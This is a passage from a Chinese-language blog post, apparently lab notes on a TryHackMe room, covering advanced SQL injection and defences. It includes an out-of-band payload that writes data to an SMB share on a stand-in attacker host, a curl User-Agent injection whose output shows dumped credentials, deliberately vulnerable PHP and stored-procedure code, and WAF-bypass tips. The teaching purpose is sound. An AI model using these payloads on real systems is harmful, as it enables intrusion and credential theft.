<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;; SELECT @@version INTO OUTFILE &#x27;</span>\\\\ATTACKBOX_IP\\logs\\out.txt<span class="string">&#x27;; --</span></span><br></pre></td></tr></table></figure>

<p>我们来剖析一下上面的有效负载：</p>
<ul>
<li><code>1&#39;</code>：关闭 SQL 查询中的原始字符串。</li>
<li><code>;</code>：结束第一个 SQL 语句。</li>
<li><code>SELECT @@version INTO OUTFILE &#39;\\\\ATTACKBOX_IP\\logs\\out.txt&#39;;</code>：执行一个新的 SQL 语句，该语句检索数据库版本并将其写入位于 \ATTACKBOX_IP\logs\out.txt 的 SMB 共享。</li>
<li><code>--</code>：注释原始 SQL 查询的其余部分以防止语法错误。</li>
</ul>
<p>为了利用有效负载，攻击者将访问在外部 SMB 共享中创建文件的 URL。</p>
<p>要访问该文件，请使用 查看目录中收到的文件，如下所示：<code>ls /tmp``/tmp</code>  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">thm@machine$ls /tmp</span><br><span class="line">out.txt</span><br></pre></td></tr></table></figure>

<h1 id="高级-SQL-注入"><a href="#高级-SQL-注入" class="headerlink" title="高级 SQL 注入"></a>高级 SQL 注入</h1><p>高级 SQL 注入涉及一系列超越基本攻击的复杂方法。以下是渗透测试人员应注意的一些重要高级技术：</p>
<p>HTTP 协议标头注入</p>
<p>HTTP 标头可以携带用户输入，这些输入可能用于服务器端的 SQL 查询。如果这些输入没有被清理，可能会导致 SQL 注入。该技术涉及操作 HTTP 标头（如 <strong>User-Agent</strong>、<strong>Referer</strong> 或 <strong>X-Forwarded-For</strong>）以注入 SQL 命令。服务器可能会记录这些标头或在 SQL 查询中使用它们。例如，恶意 User-Agent 报头将类似于 . 如果服务器在 SQL 查询中包含 User-Agent 标头而未对其进行清理，则可能会导致 SQL 注入。<code>User-Agent: &#39; OR 1=1; --</code></p>
<p>在此示例中，Web 应用程序将 HTTP 请求的 User-Agent 标头记录到数据库中名为 logs 的表中。应用程序提供了一个终端节点，用于显示 logs 表中的所有记录条目。当用户访问网页时，他们的浏览器会发送一个 User-Agent 标头，用于标识浏览器和操作系统。此标头通常用于日志记录目的或为特定浏览器定制内容。在我们的应用程序中，此 User-Agent 标头入到日志表中，然后可以通过提供的端点进行查看。<code>http://10.10.164.79/httpagent/</code></p>
<p>给定终端节点，攻击者可能会尝试将 SQL 代码注入 User-Agent 标头，以利用 SQL 注入漏洞。例如，通过将 User-Agent 标头设置为恶意值（如 ），攻击者会尝试注入 SQL 代码，将 logs 表的结果与 user 表中的敏感数据组合在一起。<code>User-Agent: &#39; UNION SELECT username, password FROM user; --</code></p>
<p>以下是插入日志的服务器端代码。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$userAgent</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>];</span><br><span class="line"><span class="variable">$insert_sql</span> = <span class="string">&quot;INSERT INTO logs (user_Agent) VALUES (&#x27;<span class="subst">$userAgent</span>&#x27;)&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$insert_sql</span>) === <span class="literal">TRUE</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;p class=&#x27;text-green-500&#x27;&gt;New logs inserted successfully&lt;/p&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;p class=&#x27;text-red-500&#x27;&gt;Error: &quot;</span> . <span class="variable">$conn</span>-&gt;error . <span class="string">&quot; (Error Code: &quot;</span> . <span class="variable">$conn</span>-&gt;errno . <span class="string">&quot;)&lt;/p&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM logs WHERE user_Agent = &#x27;<span class="subst">$userAgent</span>&#x27;&quot;</span>;</span><br><span class="line">..</span><br><span class="line">... </span><br></pre></td></tr></table></figure>

<p>User-Agent 值使用 INSERT SQL 语句插入到日志表中。如果插入成功，则会显示一条成功消息。如果在插入过程中出现错误，则会显示包含详细信息的错误消息。<br><a target="_blank" rel="noopener" href="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241207165929.png" title="image.png" class="gallery-item"><img src="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241207165929.png" alt="image.png"></a></p>
<p><strong>准备 Payload</strong></p>
<p>我们将准备 SQL 有效负载并将其注入 User-Agent 标头，以演示如何通过 HTTP 标头利用 SQL 注入。我们的目标有效负载将是 ‘ UNION SELECT 用户名，密码 FROM 用户;#. 此有效负载旨在：</p>
<ul>
<li><strong>关闭现有字符串文字</strong>：初始单引号 （） 用于关闭 SQL 查询中的现有字符串文字。<code>&#39;</code></li>
<li><strong>注入 UNION SELECT 语句</strong>：有效负载的一部分用于从 user 表中检索 username 和 password 列。<code>UNION SELECT username, password FROM user;</code></li>
<li><strong>Comment out the Rest of the Query</strong>：该字符用于注释掉 SQL 查询的其余部分，确保忽略任何后续 SQL 代码。<code>#</code></li>
</ul>
<p>我们需要将此有效负载作为 HTTP 请求中 User-Agent 标头的一部分发送，以注入此有效负载，这可以使用 <strong>Burp Suite</strong> 或 <strong>cURL</strong> 等工具完成。我们将使用 curl 命令行工具发送带有自定义 User-Agent 标头的 HTTP 请求。打开终端并访问您的命令行界面。 使用以下命令发送带有自定义标头的请求 ：<code>User-Agent</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user@tryhackme$ curl -H <span class="string">&quot;User-Agent: &#x27; UNION SELECT username, password FROM user; # &quot;</span> http://10.10.164.79/httpagent/ &lt;!DOCTYPE html&gt; &lt;html lang=<span class="string">&quot;en&quot;</span>&gt; &lt;<span class="built_in">head</span>&gt; &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt; &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt; &lt;title&gt;SQL Injection &lt;/title&gt; rel=<span class="string">&quot;stylesheet&quot;</span>&gt; &lt;/head&gt; &lt;body class=<span class="string">&quot;bg-gray-100&quot;</span>&gt; &lt;div class=<span class="string">&quot;container mx-auto p-8&quot;</span>&gt; &lt;h1 class=<span class="string">&quot;text-4xl font-bold mb-8 text-center&quot;</span>&gt;HTTP Logs&lt;/h1&gt; &lt;div class=<span class="string">&quot;bg-white p-6 rounded-lg shadow-lg&quot;</span>&gt; &lt;p class=<span class="string">&#x27;text-gray-600 text-sm mb-4&#x27;</span>&gt;Generated SQL Query: &lt;span class=<span class="string">&#x27;text-red-500&#x27;</span>&gt;SELECT * FROM logs WHERE user_Agent = <span class="string">&#x27;&#x27;</span> UNION SELECT username, password FROM user; <span class="comment">#&#x27;&lt;/span&gt;&lt;/p&gt;&lt;div class=&#x27;p-4 bg-gray-100 rounded shadow mb-4&#x27;&gt;&lt;p class=&#x27;font-bold&#x27;&gt;id: &lt;span class=&#x27;text-gray-700&#x27;&gt;bob&lt;/span&gt;&lt;/p&gt;&lt;p class=&#x27;font-bold&#x27;&gt;user_Agent: &lt;span class=&#x27;text-gray-700&#x27;&gt;bob@123&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;&lt;div class=&#x27;p-4 bg-gray-100 rounded shadow mb-4&#x27;&gt;&lt;p class=&#x27;font-bold&#x27;&gt;id: &lt;span class=&#x27;text-gray-700&#x27;&gt;attacker&lt;/span&gt;&lt;/p&gt;&lt;p class=&#x27;font-bold&#x27;&gt;user_Agent: &lt;span class=&#x27;text-gray-700&#x27;&gt;tesla&lt;/span&gt;&lt;/p&gt;&lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/body&gt; &lt;/html&gt;</span></span><br></pre></td></tr></table></figure>

<p>服务器的响应将显示在终端中。如果 SQL 注入成功，您将在响应中看到提取的数据（用户名和密码）。</p>
<p>利用存储过程</p>
<p>存储过程是存储在数据库中的例程，可以执行各种操作，例如插入、更新或查询数据。虽然存储过程可以帮助提高性能并确保一致性，但如果处理不当，它们也可能容易受到 SQL 注入的影响。</p>
<p><a target="_blank" rel="noopener" href="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241207170002.png" title="image.png" class="gallery-item"><img src="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241207170002.png" alt="image.png"></a></p>
<p>存储过程是预编译的 SQL 语句，可以作为单个单元执行。它们存储在数据库中，应用程序可以调用它们来执行特定任务。存储过程可以接受参数，这使它们变得灵活而强大。但是，如果这些参数没有得到适当的清理，它们可能会引入 SQL 注入漏洞。</p>
<p>考虑一个旨在根据用户名检索用户数据的存储过程：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">CREATE PROCEDURE sp_getUserData</span><br><span class="line">    @username <span class="title function_ invoke__">NVARCHAR</span>(<span class="number">50</span>)</span><br><span class="line">AS</span><br><span class="line">BEGIN</span><br><span class="line">    DECLARE @sql <span class="title function_ invoke__">NVARCHAR</span>(<span class="number">4000</span>)</span><br><span class="line">    SET @sql = <span class="string">&#x27;SELECT * FROM users WHERE username = &#x27;</span><span class="string">&#x27;&#x27;</span> + @username + <span class="string">&#x27;&#x27;</span><span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="title function_ invoke__">EXEC</span>(@sql)</span><br><span class="line">END</span><br></pre></td></tr></table></figure>

<p>在此示例中，存储过程将 @username 参数连接到动态 SQL 查询中。这种方法容易受到 SQL 注入的攻击，因为输入没有经过清理。</p>
<p>XML 和 JSON 注入  </p>
<p>解析 XML 或 JSON 数据并在 SQL 查询中使用解析数据的应用程序如果未正确清理输入，则可能容易受到注入。XML 和 JSON 注入涉及将恶意数据注入 XML 或 JSON 结构，然后在 SQL 查询中使用这些数据。如果应用程序直接在 SQL 语句中使用解析的值，则可能会发生这种情况。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;username&quot;</span>: <span class="string">&quot;admin&#x27; OR &#x27;1&#x27;=&#x27;1--&quot;</span>,</span><br><span class="line">  <span class="string">&quot;password&quot;</span>: <span class="string">&quot;password&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果应用程序直接在 SQL 查询中使用这些值（如 ），则可能会导致注入。<code>SELECT * FROM users WHERE username = &#39;admin&#39; OR &#39;1&#39;=&#39;1&#39;-- AND password = &#39;password&#39;</code></p>
<p>QL由于安全措施的实施不当和不同 Web 框架的复杂性，注入仍然是一个常见的威胁_。_自动识别和利用这些漏洞可能具有挑战性，但已经开发了多种工具和技术来帮助简化这一过程。!</p>
<p>识别过程中的主要问题</p>
<p>识别 SQL 注入漏洞涉及多项挑战，类似于识别任何其他服务器端漏洞。以下是关键问题：</p>
<ul>
<li><strong>SQL 查询的动态性质</strong>：SQL 查询可以动态构建，因此难以检测注入点。具有多层逻辑的复杂查询可能会掩盖潜在的漏洞。</li>
<li><strong>各种注入点</strong>：SQL 注入可能发生在应用程序的不同部分，包括输入字段、HTTP 标头和 URL 参数。识别所有可能的注入点需要彻底的测试和对应用的全面了解。</li>
<li><strong>使用安全措施</strong>：应用程序可以使用准备好的语句、参数化查询和 ORM 框架，这可以防止 SQL 注入。自动化工具必须能够区分安全和不安全的查询构造。</li>
<li><strong>上下文特定检测</strong>：在 SQL 查询中使用用户输入的上下文可能差异很大。工具必须适应不同的环境，以准确识别漏洞。</li>
</ul>
<p>几个重要的工具</p>
<p>安全社区内已经开发了几个著名的工具和项目，以帮助自动查找 SQL 注入漏洞。以下是一些众所周知的工具和 GitHub 存储库，它们提供了检测和利用 SQL 注入的功能：</p>
<ul>
<li>**<a target="_blank" rel="noopener" href="https://github.com/sqlmapproject/sqlmap">SQLMap</a>**：SQLMap 是一种开源工具，可自动执行检测和利用 Web 应用程序中的 SQL 注入漏洞的过程。它支持广泛的数据库，并为识别和利用提供了广泛的选项。您可以<a target="_blank" rel="noopener" href="https://tryhackme.com/r/room/sqlmap">在此处</a>了解有关该工具的更多信息。</li>
<li>**<a target="_blank" rel="noopener" href="https://github.com/xxgrunge/sqlninja">SQLNinja</a>**：SQLNinja 是一种专门用于利用使用 Microsoft SQL Server 作为后端数据库的 Web 应用程序中的 SQL 注入漏洞的工具。它自动执行各个阶段的漏洞利用，包括数据库指纹识别和数据提取。</li>
<li><a target="_blank" rel="noopener" href="https://github.com/ron190/jsql-injection"><strong>JSQL 注入</strong></a>：一个 Java 库，专注于检测 Java 应用程序中的 SQL 注入漏洞。它支持各种类型的 SQL 注入攻击，并提供一系列用于提取数据和控制数据库的选项。</li>
<li><strong><a target="_blank" rel="noopener" href="https://github.com/CiscoCXSecurity/bbqsql">烧烤SQL：</a></strong> BBQSQL 是一个 Blind SQL Injection 漏洞利用框架，旨在简单且高效地自动利用 Blind SQL Injection 漏洞。</li>
</ul>
<p>自动识别和利用 SQL 注入漏洞对于维护 Web 应用程序安全至关重要。SQLMap、SQLNinja 和 BBQSQL 等工具为检测和利用这些漏洞提供了强大的功能。但是，重要的是要了解自动化工具的局限性以及手动分析和验证的必要性，以确保全面的安全覆盖。通过将这些工具集成到您的安全工作流程中并遵循输入验证和查询构建的最佳实践，您可以有效降低与 SQL 注入漏洞相关的风险。</p>
<h1 id="最佳实践"><a href="#最佳实践" class="headerlink" title="最佳实践"></a>最佳实践</h1><p>SQL 注入是一个众所周知且普遍存在的漏洞，多年来一直是 Web 应用程序安全的主要关注点。渗透测试人员在评估期间必须特别注意此漏洞，因为它需要全面了解识别和利用 SQL 注入点的各种技术。同样，安全编码人员必须通过实施强大的输入验证并遵守安全编码实践来防止此类攻击，从而优先考虑保护其应用程序。下面提到了一些最佳实践：</p>
<p>安全编码员</p>
<ul>
<li><strong>参数化查询和预编译语句</strong>：使用参数化查询和预编译语句来确保所有用户输入都被视为数据而不是可执行代码。此技术通过将查询结构与数据分离来帮助防止 SQL 注入。例如，在带有 PDO 的 PHP 中，您可以准备一个语句并绑定参数，这可确保用户输入得到安全处理，就像 .<code>$stmt = $pdo-&gt;prepare(&quot;SELECT * FROM users WHERE username = :username&quot;); $stmt-&gt;execute([&#39;username&#39; =&gt; $username]);</code></li>
<li><strong>输入验证和清理</strong>：实施强大的输入验证和清理，以确保输入符合预期格式。验证数据类型、长度和范围，并拒绝任何不符合这些条件的输入。使用 PHP 中的内置函数（如 和）来有效地清理输入。<code>htmlspecialchars()``filter_var()</code></li>
<li><strong>最低权限原则</strong>：通过向应用程序帐户授予最低必要的数据库权限来应用最低权限原则。避免使用具有管理权限的数据库帐户进行日常操作。这通过限制攻击者对关键数据库功能的访问，将成功的 SQL 注入攻击的潜在影响降至最低。</li>
<li><strong>存储过程</strong>：使用存储过程封装和验证 SQL 逻辑。这允许您控制和验证数据库本身内的输入，从而降低 SQL 注入的风险。确保存储过程仅接受经过验证的输入，并且设计为在内部处理输入清理。</li>
<li><strong>定期安全审计和代码审查</strong>：定期进行安全审计和代码审查，以识别和解决漏洞。自动化工具可以帮助扫描 SQL 注入风险，但人工审查对于发现细微问题也是必不可少的。定期审核可确保您的安全实践与不断变化的威胁保持同步。</li>
</ul>
<p>渗透测试器</p>
<ul>
<li><strong>利用特定于数据库的功能</strong>：不同的数据库管理系统 （DBMS） 具有独特的功能和语法。渗透测试人员应该了解目标 DBMS（例如 MySQL、PostgreSQL、Oracle、MSSQL）的细节，以有效地利用这些功能。例如，MSSQL 支持该命令，该命令可用于执行系统命令。<code>xp_cmdshell</code></li>
<li><strong>利用错误消息</strong>：利用详细的错误消息来深入了解数据库架构和结构。基于错误的 SQL 注入涉及触发应用程序生成错误消息，以揭示有用的信息。例如，使用 1’ AND 1&#x3D;CONVERT（int， （SELECT @@version）） – 可能会生成泄漏版本信息的错误。</li>
<li><strong>绕过 WAF 和过滤器</strong>：测试各种混淆技术以绕过 Web 应用程序防火墙 （WAF） 和输入过滤器。这包括使用混合大小写 （SeLeCt）、串联 （CONCAT（CHAR（83）、CHAR（69）、CHAR（76）、CHAR（69）、CHAR（67）、CHAR（84））） 和替代编码（十六进制、URL 编码）。此外，使用内联注释 （&#x2F;**&#x2F;） 和不同的字符编码 （例如 %09、%0A） 可以帮助绕过简单的过滤器。</li>
<li><strong>数据库指纹识别</strong>：确定数据库的类型和版本以定制攻击。这可以通过发送特定查询来完成，这些查询根据 DBMS 产生不同的结果。例如，SELECT version（） 适用于 PostgreSQL，而 SELECT @@version适用于 MySQL 和 MSSQL。</li>
<li><strong>使用 SQL 注入进行透视</strong>：使用 SQL 注入来透视和利用网络的其他部分。一旦数据库服务器遭到入侵，它就可以用于访问其他内部系统。这可能涉及提取凭证或利用系统之间的信任关系。</li>
</ul>
<p>高级 SQL 注入测试需要对各种技术有深入的了解，并能够适应不同的环境。渗透测试人员应采用各种方法，从利用特定于数据库的功能到绕过复杂的过滤器，再到彻底评估和利用 SQL 注入漏洞。有条不紊地记录每个步骤可确保对应用程序的安全性进行全面评估。</p>
</div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {
        var options = {
            selector: '.gallery-item'
        };
        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);
        }</script>
  </div>
</article>


    <div class="blog-post-comments">
        <div id="utterances_thread">
            <noscript>加载评论需要在浏览器启用 JavaScript 脚本支持。</noscript>
        </div>
    </div>


        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">首页</a></li>
        
          <li><a href="/archives/">归档</a></li>
        
          <li><a href="/tags/">标签</a></li>
        
          <li><a href="/sites/">站点</a></li>
        
          <li><a target="_blank" rel="noopener" href="http://github.com/leonooo13">项目</a></li>
        
          <li><a href="/search/">搜索</a></li>
        
          <li><a href="/about/">关于</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-number">1.</span> <span class="toc-text">简介</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%A6%E5%86%85-SQL-%E6%B3%A8%E5%85%A5"><span class="toc-number">1.1.</span> <span class="toc-text">带内 SQL 注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8E%A8%E7%90%86%EF%BC%88%E7%9B%B2%E7%9B%AE%EF%BC%89SQL-%E6%B3%A8%E5%85%A5"><span class="toc-number">1.2.</span> <span class="toc-text">推理（盲目）SQL 注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%A6%E5%A4%96-SQL-%E6%B3%A8%E5%85%A5"><span class="toc-number">1.3.</span> <span class="toc-text">带外 SQL 注入</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%E9%98%B6-SQL-%E6%B3%A8%E5%85%A5"><span class="toc-number">2.</span> <span class="toc-text">二阶 SQL 注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Filter-Evasion-%E6%8A%80%E6%9C%AF"><span class="toc-number">3.</span> <span class="toc-text">Filter Evasion 技术</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B8%A6%E5%A4%96-SQL-%E6%B3%A8%E5%85%A5-1"><span class="toc-number">4.</span> <span class="toc-text">带外 SQL 注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%AB%98%E7%BA%A7-SQL-%E6%B3%A8%E5%85%A5"><span class="toc-number">5.</span> <span class="toc-text">高级 SQL 注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5"><span class="toc-number">6.</span> <span class="toc-text">最佳实践</span></a></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://imli.ink/2024/12/07/advancedsqlinjection/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://imli.ink/2024/12/07/advancedsqlinjection/&text=高级 SQL 注入"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://imli.ink/2024/12/07/advancedsqlinjection/&title=高级 SQL 注入"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://imli.ink/2024/12/07/advancedsqlinjection/&is_video=false&description=高级 SQL 注入"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=高级 SQL 注入&body=Check out this article: https://imli.ink/2024/12/07/advancedsqlinjection/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://imli.ink/2024/12/07/advancedsqlinjection/&title=高级 SQL 注入"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://imli.ink/2024/12/07/advancedsqlinjection/&title=高级 SQL 注入"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://imli.ink/2024/12/07/advancedsqlinjection/&title=高级 SQL 注入"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://imli.ink/2024/12/07/advancedsqlinjection/&title=高级 SQL 注入"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://imli.ink/2024/12/07/advancedsqlinjection/&name=高级 SQL 注入&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://imli.ink/2024/12/07/advancedsqlinjection/&t=高级 SQL 注入"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
      
        
          2016-2024
            Leon
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       -->
          <li><a href="/">
              首页
            </a></li><!--
     -->
          <!--
       -->
          <li><a href="/archives/">
              归档
            </a></li><!--
     -->
          <!--
       -->
          <li><a href="/tags/">
              标签
            </a></li><!--
     -->
          <!--
       -->
          <li><a href="/sites/">
              站点
            </a></li><!--
     -->
          <!--
       -->
          <li><a target="_blank" rel="noopener" href="http://github.com/leonooo13">
              项目
            </a></li><!--
     -->
          <!--
       -->
          <li><a href="/search/">
              搜索
            </a></li><!--
     -->
          <!--
       -->
          <li><a href="/about/">
              关于
            </a></li><!--
     -->
          
      </ul>
    </nav>
  </div>
  <div class="footer-center">
    
      <!-- 不蒜子统计 -->
      <span id="busuanzi_container_site_pv">
        总访问量<span id="busuanzi_value_site_pv"></span>次
      </span>
      <span class="post-meta-divider">|</span>
      <span id="busuanzi_container_site_uv" style='display:none'>
        访客数<span id="busuanzi_value_site_uv"></span>人
      </span>
      <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
      
  </div>
</footer>
    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "复制成功！");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

    <script type="text/javascript">
      var utterances_repo = 'leonooo13/Talk';
      var utterances_issue_term = 'pathname';
      var utterances_label = 'Comment';
      var utterances_theme = 'photon-dark';

      (function(){
          var script = document.createElement('script');

          script.src = 'https://utteranc.es/client.js';
          script.setAttribute('repo', utterances_repo);
          script.setAttribute('issue-term', 'pathname');
          script.setAttribute('label', utterances_label);
          script.setAttribute('theme', utterances_theme);
          script.setAttribute('crossorigin', 'anonymous');
          script.async = true;
          (document.getElementById('utterances_thread')).appendChild(script);
      }());
  </script>



<!-- FancyBox -->

  <script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@4.0/dist/fancybox.umd.js"></script>
  
</body>
</html>
